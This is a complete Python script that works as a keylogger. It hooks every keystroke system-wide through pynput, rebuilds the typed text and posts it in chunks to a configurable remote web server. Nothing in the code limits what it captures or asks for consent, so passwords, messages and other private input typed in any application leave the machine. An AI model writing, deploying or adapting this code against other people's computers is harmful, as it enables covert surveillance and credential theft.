import os
import time
import json
from threading import Lock
from urllib.error import URLError, HTTPError
from urllib.request import Request, urlopen

from pynput.keyboard import Key, KeyCode, Listener

MESSAGE_GAP_MS = 1200
SITE_URL = os.getenv("KEY_FEED_URL", "https://your-app.onrender.com").rstrip("/")
API_KEY = os.getenv("KEY_FEED_API_KEY", "")
message_buffer = ""
last_key_time_ms = None
message_started_ms = None
active_modifiers = set()
state_lock = Lock()

SHIFTED_SYMBOLS = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
    "-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
    ";": ":", "'": '"', ",": "<", ".": ">", "/": "?", "`": "~",
}


def normalize_key(key):
    if key in (Key.shift, Key.shift_l, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.ctrl_r,
               Key.alt, Key.alt_l, Key.alt_r, Key.cmd, Key.cmd_l, Key.cmd_r):
        return ""
    if key == Key.space:
        return " "
    if key == Key.enter:
        return "\n"
    if key == Key.tab:
        return "\t"
    if key == Key.backspace:
        return "\b"
    if isinstance(key, KeyCode) and key.char is not None:
        value = key.char
        if Key.shift in active_modifiers and value.isalpha():
            return value.upper()
        return SHIFTED_SYMBOLS.get(value, value) if Key.shift in active_modifiers else value
    return ""


def send_message(text):
    try:
        headers = {"Content-Type": "application/json"}
        if API_KEY:
            headers["X-API-Key"] = API_KEY
        request = Request(
            f"{SITE_URL}/api/messages",
            data=json.dumps({"text": text}).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        print(f"Could not send message: {error}")


def flush_message_buffer():
    global message_buffer, last_key_time_ms, message_started_ms
    text = message_buffer.strip()
    message_buffer = ""
    last_key_time_ms = None
    message_started_ms = None
    if text:
        send_message(text)


def on_press(key):
    global message_buffer, last_key_time_ms, message_started_ms
    with state_lock:
        modifier_aliases = {
            Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
            Key.ctrl_r: Key.ctrl, Key.alt_l: Key.alt, Key.alt_r: Key.alt,
            Key.cmd_l: Key.cmd, Key.cmd_r: Key.cmd,
        }
        if key in modifier_aliases or key in (Key.shift, Key.ctrl, Key.alt, Key.cmd):
            active_modifiers.add(modifier_aliases.get(key, key))
            return

        symbol = normalize_key(key)
        now_ms = time.time() * 1000
        if symbol == "\b":
            message_buffer = message_buffer[:-1]
            last_key_time_ms = now_ms
        elif symbol == "\n":
            flush_message_buffer()
        elif symbol:
            if message_buffer and last_key_time_ms and now_ms - last_key_time_ms >= MESSAGE_GAP_MS:
                flush_message_buffer()
            if message_started_ms is None:
                message_started_ms = now_ms
            message_buffer += symbol
            last_key_time_ms = now_ms


def on_release(key):
    aliases = {
        Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
        Key.ctrl_r: Key.ctrl, Key.alt_l: Key.alt, Key.alt_r: Key.alt,
        Key.cmd_l: Key.cmd, Key.cmd_r: Key.cmd,
    }
    active_modifiers.discard(aliases.get(key, key))


print(f"Sending to {SITE_URL}")
with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
    keyboard_listener.join()